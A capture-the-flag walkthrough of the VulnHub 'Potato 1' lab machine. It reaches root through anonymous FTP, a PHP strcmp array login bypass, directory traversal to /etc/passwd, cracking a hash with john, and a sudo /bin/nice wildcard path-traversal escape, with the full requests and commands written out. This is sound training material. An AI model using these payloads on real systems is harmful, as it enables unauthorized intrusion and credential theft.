# Potato
Potato 1 from VulnHub

## Recon

Nmap scan to start as always.

````shell

┌──(kali㉿kali)-[~/Documents]

└─$ sudo nmap -sV -sC -T4 -A 192.168.177.101 -o scan

Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 20:06 EST

Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute

Traceroute Timing: About 32.26% done; ETC: 20:07 (0:00:00 remaining)

Nmap scan report for 192.168.177.101

Host is up (0.074s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

|   3072 ef240eabd2b316b44b2e27c05f48798b (RSA)

|   256 f2d8353f4959858507e6a20e657a8c4b (ECDSA)

|_  256 0b2389c3c026d5645e93b7baf5147f3e (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

|_http-server-header: Apache/2.4.41 (Ubuntu)

|_http-title: Potato company

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TRACEROUTE (using port 993/tcp)

HOP RTT      ADDRESS

1   87.75 ms 192.168.45.1

2   89.93 ms 192.168.251.1

3   90.51 ms 192.168.177.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 37.59 seconds

````

Looks like we have an Apache webserver running, lets visit it and see what we're working with

We have a simple html page with a picture of a potato, let’s explore the site and try to find something.

Do some directory busting!

```shell
┌──(kali㉿kali)-[~/Documents/potato]

└─$ dirb http://192.168.177.101/ /usr/share/wordlists/dirb/common.txt

-----------------

DIRB v2.22   

By The Dark Raver

-----------------

START_TIME: Sun Jan 29 20:14:22 2023

URL_BASE: http://192.168.177.101/

WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.177.101/ ----

^A                                                                                                                                   ==> DIRECTORY: http://192.168.177.101/admin/                                                                                        

+ http://192.168.177.101/index.php (CODE:200|SIZE:245)                                                                             

+ http://192.168.177.101/server-status (CODE:403|SIZE:280)

+ http://192.168.177.101/admin (CODE:200|SIZE:245)

```
/admin looks interesting

we are greeted with a simple login page.

lets intercept the POST request with burp, save it, and run SQLMAP to check for injections

```shell

(kali㉿kali)-[~/Documents/potato]

└─$ sqlmap -l request                     

```

Looks like the form is not injectable, lets check that potato.jpg image for any stego

```shell

──(kali㉿kali)-[~/Documents/potato]

└─$ steghide --extract -sf potato.jpg

```

nothing found....

I'm having trouble finding anything exploitable so let’s rerun that Nmap scan but add the -p- flag to check the uncommon ports.

```shell

┌──(kali㉿kali)-[~/Documents]

└─$ sudo nmap -sV -sC -T4 -A 192.168.177.101 -p- -o scan

2112/tcp open  ftp     ProFTPD

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak

|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg

```

## Information Gathering

LET’S GO! We found FTP service on port 2112.

Looks like anonymous login is enabled!

Let’s see what’s on the server.

```shell

┌──(kali㉿kali)-[~/Documents/potato]

└─$ ftp anonymous@192.168.177.101 2112

Connected to 192.168.177.101.

220 ProFTPD Server (Debian) [::ffff:192.168.177.101]

331 Anonymous login ok, send your complete email address as your password

ftp> dir

229 Entering Extended Passive Mode (|||43887|)

150 Opening ASCII mode data connection for file list

-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak

-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg

```

a few files listed; can we upload something?

```shell

ftp> put request

local: request remote: request

229 Entering Extended Passive Mode (|||59859|)

550 request: Operation not permitted

ftp>

````

Nope, not allowed. lets download the backup and see if we can anything interesting

```shell

ftp> get index.php.bak

local: index.php.bak remote: index.php.bak

229 Entering Extended Passive Mode (|||34853|)

150 Opening BINARY mode data connection for index.php.bak (901 bytes)

   901        1.22 MiB/s

226 Transfer complete

901 bytes received in 00:00 (13.95 KiB/s)

ftp>

```

```shell

┌──(kali㉿kali)-[~/Documents/potato]

└─$ cat index.php.bak

<html>

<head></head>

<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){

  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {

    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";

    setcookie('pass', $pass, time() + 365*24*3600);

  }else{

    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";

  }

  exit();

}

?>

  <form action="index.php?login=1" method="POST">

                <h1>Login</h1>

                <label><b>User:</b></label>

                <input type="text" name="username" required>

                </br>

                <label><b>Password:</b></label>

                <input type="password" name="password" required>

                </br>

                <input type="submit" id='submit' value='Login' >

  </form>

</body>

</html>

```

We found some PHP, lets research that function that evaluates the pass and username.

The strcmp function can be evaluated to true by returning 0, the function

has a problem with handling arrays when it expects a string, if you pass in

a an array instead of a string it will evaluate to 0, making the logic true and bypassing the login.

https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf

Let’s intercept the request in burp and insert the array.

## Bypass Authentication

````http

POST /admin/index.php?login=1 HTTP/1.1

Host: 192.168.155.101

Content-Length: 30

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://192.168.155.101

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://192.168.155.101/admin/

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

username=admin&password=potato

````

Now I’ll edit the request to make the password an array.

````http

POST /admin/index.php?login=1 HTTP/1.1

Host: 192.168.155.101

Content-Length: 26

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://192.168.155.101

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://192.168.155.101/admin/

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

username=admin&password[]=

````

Send it off.....

We are in!

````http

HTTP/1.1 200 OK

Date: Mon, 30 Jan 2023 12:16:42 GMT

Server: Apache/2.4.41 (Ubuntu)

Set-Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh; expires=Tue, 30-Jan-2024 12:16:42 GMT; Max-Age=31536000

Vary: Accept-Encoding

Content-Length: 91

Connection: close

Content-Type: text/html; charset=UTF-8

<html>

<head></head>

<body>

Welcome! </br> Go to the <a href="dashboard.php">dashboard</a>

````

We have a simple page that has as few hyperlinks.

```html

Home   Users   Date   Logs   Ping

Admin area

Access forbidden if you don't have permission to access.

```

Exploring a little bit, the 'Logs' or the 'Ping' page could possibly be a command injection...
 let’s start with logs

````

Home   Users   Date   Logs   Ping

show log:

 log_03.txt

 log_02.txt

 log_01.txt

Get the log.

Contenu du fichier log_01.txt :

Operation: password change

Date: January 03, 2020 / 11:25 a.m.

User: admin

Status: OK

````

Let’s intercept the request again in burp and download a log to see how it grabs the info

````http

POST /admin/dashboard.php?page=log HTTP/1.1

Host: 192.168.155.101

Content-Length: 15

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://192.168.155.101

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://192.168.155.101/admin/dashboard.php?page=log

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh

Connection: close

file=log_02.txt

````

Ok ok looks like a possible LFI & Directory Traversal?

let’s try to read the /etc/passwd file using the file= parameter

````http

POST /admin/dashboard.php?page=log HTTP/1.1

Host: 192.168.155.101

Content-Length: 40

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://192.168.155.101

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://192.168.155.101/admin/dashboard.php?page=log

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh

Connection: close

file=/../../../../../../../../etc/passwd

````

the response:

```html

HTTP/1.1 200 OK

Date: Mon, 30 Jan 2023 12:23:42 GMT

Server: Apache/2.4.41 (Ubuntu)

Vary: Accept-Encoding

Content-Length: 2840

Connection: close

Content-Type: text/html; charset=UTF-8

<html>

<head><title>Admin area</title></head>

<body>

<a href="dashboard.php"> Home </a>&emsp;

<a href="dashboard.php?page=users">Users </a>&emsp;

<a href="dashboard.php?page=date"> Date </a>&emsp;

<a href="dashboard.php?page=log"> Logs </a>&emsp;

<a href="dashboard.php?page=ping"> Ping </a>

<h2>show log:</h2>

<form action="dashboard.php?page=log" method="post">

<div>

  <input type="radio" name="file" value="log_03.txt">

  <label for="log_03.txt">log_03.txt</label>

</div><div>

  <input type="radio" name="file" value="log_02.txt">

  <label for="log_02.txt">log_02.txt</label>

</div><div>

  <input type="radio" name="file" value="log_01.txt">

  <label for="log_01.txt">log_01.txt</label>

</div></br></br>

    <div class="button">

        <button type="submit">Get the log</button>

    </div>

</form>

Contenu du fichier /../../../../../../../../etc/passwd :  </br><PRE>root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin

systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin

systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin

messagebus:x:103:106::/nonexistent:/usr/sbin/nologin

syslog:x:104:110::/home/syslog:/usr/sbin/nologin

_apt:x:105:65534::/nonexistent:/usr/sbin/nologin

tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false

uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin

tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin

landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin

pollinate:x:110:1::/var/cache/pollinate:/bin/false

sshd:x:111:65534::/run/sshd:/usr/sbin/nologin

systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

florianges:x:1000:1000:florianges:/home/florianges:/bin/bash

lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false

proftpd:x:112:65534::/run/proftpd:/usr/sbin/nologin

ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin

webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash

</PRE>

````

We got the /etc/passwd file and the hash for the webadmin account!

Lets try to crack it with john.

````shell

┌──(kali㉿kali)-[~/Documents/potato/john]

└─$ touch hash.john | echo -e '$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/' >> hash.john

┌──(kali㉿kali)-[~/Documents/potato/john]

└─$ john hash.john      

Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"

Use the "--format=md5crypt-long" option to force loading these as that type instead

Using default input encoding: UTF-8

Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])

Will run 4 OpenMP threads

Proceeding with single, rules:Single

Press 'q' or Ctrl-C to abort, almost any other key for status

Almost done: Processing the remaining buffered candidate passwords, if any.

Proceeding with wordlist:/usr/share/john/password.lst

dragon           (?)    

1g 0:00:00:00 DONE 2/3 (2023-01-30 07:46) 33.33g/s 6400p/s 6400c/s 6400C/s 123456..knight

Use the "--show" option to display all of the cracked passwords reliably

Session completed.

````

We got the password: **dragon

Let’s ssh into the box

````shell

┌──(kali㉿kali)-[~/Documents/potato]

└─$ ssh webadmin@192.168.155.101                  

The authenticity of host '192.168.155.101 (192.168.155.101)' can't be established.

ED25519 key fingerprint is SHA256:9DQds4tRzLVKtayQC3VgIo53wDRYtKzwBRgF14XKjCg.

This key is not known by any other names

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '192.168.155.101' (ED25519) to the list of known hosts.

webadmin@192.168.155.101's password:

Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com

 * Management:     https://landscape.canonical.com

 * Support:        https://ubuntu.com/advantage

  System information as of Mon 30 Jan 2023 01:52:33 PM UTC

  System load:  0.68               Processes:               151

  Usage of /:   12.2% of 31.37GB   Users logged in:         0

  Memory usage: 26%                IPv4 address for ens192: 192.168.155.101

  Swap usage:   0%

118 updates can be installed immediately.

33 of these updates are security updates.

To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.

To check for new updates run: sudo apt update

The programs included with the Ubuntu system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by

applicable law.

webadmin@serv:~$

```

Alright, lets grab the first flag

````shell

webadmin@serv:~$ ls

local.txt  user.txt

webadmin@serv:~$ cat local.txt

bcb73b00eb886445df77f9c8c39e2675

````

## Priv Esc

Lets try to escalate our privs, Im gonna stick linpeas on the box

Download linpeas and start a python http server to serve it to the box

````shell

┌──(kali㉿kali)-[~/Documents/potato]

└─$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh >> peas.sh

┌──(kali㉿kali)-[~/Documents/potato]

└─$ python3 -m 'http.server'      

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

````

and download onto the box

````shell

webadmin@serv:~$ wget http://192.168.45.5:8000/peas.sh

--2023-01-30 13:58:36--  http://192.168.45.5:8000/peas.sh

Connecting to 192.168.45.5:8000... connected.

HTTP request sent, awaiting response... 200 OK

Length: 828098 (809K) [text/x-sh]

Saving to: ‘peas.sh’

peas.sh                           100%[==========================================================>] 808.69K  1.29MB/s    in 0.6s   

2023-01-30 13:58:37 (1.29 MB/s) - ‘peas.sh’ saved [828098/828098]

webadmin@serv:~$ bash peas.sh

`````

Peas didn't turn up anything obvious, lets do some manuel checks

````shell

webadmin@serv:~$ sudo -l

Matching Defaults entries for webadmin on serv:

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:

    (ALL : ALL) /bin/nice /notes/*

````

Maybe we can exploit /bin/nice /notes/*?

Check GTFObins

https://gtfobins.github.io/gtfobins/nice/

A few options, lets try sudo first

````shell

webadmin@serv:~$ sudo /bin/nice /bin/sh

Sorry, user webadmin is not allowed to execute '/bin/nice /bin/sh' as root on serv.

webadmin@serv:~$

````

Not that easy...

maybe SUID perm is set.

```shell

webadmin@serv:~$ ls -la /bin/nice

-rwxr-xr-x 1 root root 43352 Sep  5  2019 /bin/nice

webadmin@serv:~$

```

nope...

Lets snoop around in the /notes directory maybe we can find something useful.

````shell

webadmin@serv:~$ ls -la /notes

total 16

drwxr-xr-x  2 root root 4096 Aug  2  2020 .

drwxr-xr-x 21 root root 4096 Sep 28  2020 ..

-rwx------  1 root root   11 Aug  2  2020 clear.sh

-rwx------  1 root root    8 Aug  2  2020 id.sh

webadmin@serv:~$

````

Interesting, after reading a little bit about sudo and perms,

it looks like this:

User webadmin may run the following commands on serv:

    (ALL : ALL) /bin/nice /notes/*

means I can only run /bin/nice within the notes directory.

lets do a sanity check

````shell

webadmin@serv:/notes$ sudo /bin/nice /notes/id.sh

uid=0(root) gid=0(root) groups=0(root)

````

Yup looks like it works. Can we trick it into thinking we are using /notes/ directory but point somewhere else?

I wrote a quick bash script to test if we are

1) running the file and

2) using root perms with it.

````

echo "TEST"

whoami

````

Save the file to our home dir and run it via nice

````shell

webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/test.sh

TEST

root

webadmin@serv:~$

````

looks like we are using root to run the file! We can edit the script to spawn a shell by adding

````shell

bash -i

````

to the end of it.

Now let’s try to spawn the root shell

````Shell

webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/test.sh

TEST

root

root@serv:/home/webadmin#

````

WE GOT ROOT.

lets grab that flag

````Shell

root@serv:/# cat root/proof.txt

32a797bb3c245310f1b20cb57dd167f4

root@serv:/#

````

### Root Flag

32a797bb3c245310f1b20cb57dd167f4
